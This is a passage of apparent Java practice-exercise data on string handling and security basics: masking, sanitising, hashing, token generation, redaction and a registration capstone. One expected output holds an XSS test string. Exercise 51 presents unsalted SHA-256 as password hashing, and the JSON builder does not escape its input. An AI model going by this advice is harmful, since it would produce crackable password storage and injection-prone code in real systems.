practice_exercises.ai_intro: Never accept unlimited length input.
practice_exercises.expected_output:
Short
This is a very lo...
(empty)

hints.message: static String limitLength(String input,int max){if(input==null)return"";if(input.length()<=max)return input;return input.substring(0,max-3)+"...";}

practice_exercises.title: Exercise 49: Credit Card Masking
practice_exercises.description: Hide all but last 4 digits of card numbers.
practice_exercises.ai_intro: Never display or log full card numbers.

hints.message: Get last 4 characters. Replace digits before them with *.

static String maskCard(String card){if(card==null||card.length()<4)return"****";StringBuilder sb=new StringBuilder();for(int i=0;i<card.length()-4;i++){char c=card.charAt(i);sb.append(Character.isDigit(c)?'*':c);}sb.append(card.substring(card.length()-4));return sb.toString();}

practice_exercises.title: Exercise 50: Full Sanitisation Pipeline
practice_exercises.description: Validate, sanitise, and escape user comment.
practice_exercises.ai_intro: Defence in depth: multiple layers of protection.
practice_exercises.expected_output:
Nice article!
alert('XSS') Great!
REJECTED
REJECTED

practice_exercises.title: Exercise 51: Password Hashing
practice_exercises.description: Hash passwords with SHA-256.
practice_exercises.ai_intro: NEVER store plain text passwords.

hints.message: StringBuilder sb=new StringBuilder(); for(byte b:hash) sb.append(String.format("%02x",b));

static String hash(String pw){try{MessageDigest md=MessageDigest.getInstance("SHA-256");byte[] h=md.digest(pw.getBytes());StringBuilder sb=new StringBuilder();for(byte b:h)sb.append(String.format("%02x",b));return sb.toString();}catch(Exception e){return"";}}

practice_exercises.title: Exercise 52: Token Generator
practice_exercises.description: Generate random secure tokens.
practice_exercises.ai_intro: Used for session IDs, API keys, password resets.
practice_exercises.expected_output:
Token: (32 random hex chars)
Short: (16 random hex chars)
Tokens differ: true

hints.message: SecureRandom random = new SecureRandom(); byte[] bytes = new byte[length/2];
random.nextBytes(bytes); then convert each byte to 2-char hex.

static String generateToken(int len){SecureRandom r=new SecureRandom();byte[] b=new byte[len/2];r.nextBytes(b);StringBuilder sb=new StringBuilder();for(byte x:b)sb.append(String.format("%02x",x));return sb.toString();}

practice_exercises.title: Exercise 53: URL Encoder
practice_exercises.description: Encode special characters in URL parameters.
practice_exercises.ai_intro: Spaces and special chars must be encoded in URLs.
practice_exercises.expected_output:
hello+world
name%3DAlice%26age%3D25
search%3Fq%3Djava+programming

practice_exercises.title: Exercise 54: Log Sanitiser
practice_exercises.description: Clean sensitive data from log messages.
practice_exercises.ai_intro: Logs must not contain passwords, tokens, or card numbers.
practice_exercises.expected_output:
User login password=*** at 14:00
Payment card=************9876 amount=99.99
Email sent to a***@company.com status=OK

hints.message: Card: find 16 consecutive digits, mask first 12.

practice_exercises.title: Exercise 55: Palindrome Checker
practice_exercises.description: Check if text is a palindrome (ignoring case and spaces).
practice_exercises.ai_intro: Clean the string first, then compare with reverse.
practice_exercises.expected_output:
true
true
false
true

hints.message: Clean: remove non-letters, lowercase. Then compare with reverse.
static boolean isPalindrome(String t){String c=t.replaceAll("[^a-zA-Z]","").toLowerCase();return c.equals(new StringBuilder(c).reverse().toString());}

practice_exercises.title: Exercise 56: Caesar Cipher
practice_exercises.description: Encrypt and decrypt messages with character shifting.
practice_exercises.ai_intro: Shift each letter by N positions, wrapping around z->a.
practice_exercises.expected_output:
Encrypted: Khoor Zruog
Decrypted: Hello World

hints.message: For each char: if letter, shift. Otherwise keep as-is.

static String cipher(String t,int s){StringBuilder sb=new StringBuilder();for(char c:t.toCharArray()){if(Character.isLowerCase(c))sb.append((char)('a'+(c-'a'+s%26+26)%26));else if(Character.isUpperCase(c))sb.append((char)('A'+(c-'A'+s%26+26)%26));else sb.append(c);}return sb.toString();}

practice_exercises.title: Exercise 57: JSON Builder
practice_exercises.description: Build a JSON string from Java data.
practice_exercises.ai_intro: APIs communicate using JSON strings.
practice_exercises.expected_output:
{"name":"Alice","age":25,"city":"London"}
{"name":"Bob","age":30,"city":"Paris"}

hints.message: static String toJson(String n,int a,String c){return String.format("{\"name\":\"%s\",\"age\":%d,\"city\":\"%s\"}",n,a,c);}

practice_exercises.title: Exercise 58: Redact Sensitive Data
practice_exercises.description: Replace sensitive patterns with [REDACTED].
practice_exercises.ai_intro: Data protection: hide personal info before sharing.
practice_exercises.expected_output:
Contact [EMAIL] or [PHONE]
Card: [CARD] expires 12/25

hints.message: Use replaceAll with regex for each pattern.

practice_exercises.title: Exercise 59: Text Analyser
practice_exercises.description: Complete text analysis tool.
practice_exercises.ai_intro: Combine all string skills into one application.
practice_exercises.expected_output:
Words: 15
Sentences: 3
Avg word length: 4.5
Most common: Java (3 times)
Longest: immutable (9 chars)

hints.message: Use HashMap<String,Integer> for word frequency count.

practice_exercises.title: Exercise 60: Secure Registration System
practice_exercises.description: Full registration with validation, sanitisation, and hashing.
practice_exercises.ai_intro: Everything from this topic in one capstone exercise.
practice_exercises.expected_output:
Register alice: true
Register bob: false
Duplicate: false
Login alice: true
Login wrong: false

hints.message: Validate: check each field with the patterns from earlier exercises.
Sanitise: username.trim().toLowerCase(). Hash: SHA-256 on password.
